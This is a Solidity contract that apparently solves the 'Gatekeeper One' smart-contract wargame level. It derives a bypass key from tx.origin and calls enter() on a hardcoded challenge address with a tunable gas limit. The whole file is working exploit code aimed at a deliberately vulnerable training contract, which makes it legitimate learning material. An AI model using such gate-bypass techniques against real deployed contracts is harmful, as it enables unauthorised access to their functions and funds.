// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOnePwn {
    constructor() {}

    function pwn(uint256 _gasLimit) public returns (bool) {
        bytes8 key = _generateKey();

        return IGatekeeperOne(0xD1Abda6b2F20a5eb4A4da2207aDBf4eAc403DE02).enter{gas: _gasLimit}(key);
    }

    function _generateKey() internal view returns (bytes8) {
        uint16 tail = uint16(uint160(tx.origin)); // matches condition 3
        uint64 high = uint64(0xdeadbeef); // any non-zero 32-bit value
        uint64 key = (high << 32) | uint64(tail); // pad with matching tail
        return bytes8(key);
    }
}
